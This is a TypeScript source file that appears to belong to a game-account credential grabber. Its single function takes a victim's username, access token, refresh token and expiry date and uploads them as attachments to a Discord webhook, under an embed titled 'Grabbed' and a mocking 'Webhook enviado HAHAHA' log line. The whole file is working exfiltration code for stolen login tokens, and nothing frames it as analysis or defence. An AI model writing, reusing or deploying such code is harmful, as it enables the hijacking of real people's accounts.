import axios from "axios";
import { GameCredentials } from "../models/dataModel";
import { config } from "../config/env"

export async function sendDiscord(data: GameCredentials): Promise<void>{
    const { token, name, expirationDate, refreshToken } = data;
    

    try{
        const form = new FormData();

    form.append("payload_json", JSON.stringify({
        embeds: [{
            title: "👺 Grabbed",
            color: 0xFF0000,
            fields: [
                { name: "Username", value: name || "N/A", inline: true },
                { name: "Expiration Date", value: expirationDate ? `<t:${Math.floor(new Date(expirationDate).getTime() / 1000)}:f>` : "N/A", inline: true }
            ],
        }],
        attachments: [{ id: 0, filename: "token.txt"}, {id: 1, filename: "refreshToken.txt"}],
    }))
    
    form.append("files[1]", new Blob([refreshToken ?? "N/A"], {type: "text/plain"}), "refreshToken.txt");
    form.append("files[0]", new Blob([token], {type: "text/plain"}), "token.txt");


   const response = await axios.post(config.discordWebhook, form);

        console.log("Webhook enviado HAHAHA", response.status);

    }catch(error){
        if(axios.isAxiosError(error)){
            console.warn("Deu erro", error.response?.data ?? error.message);
        }else{
            console.warn("Deu um erro desconhecidamente foda", error);
        }
        throw error;
    }
}
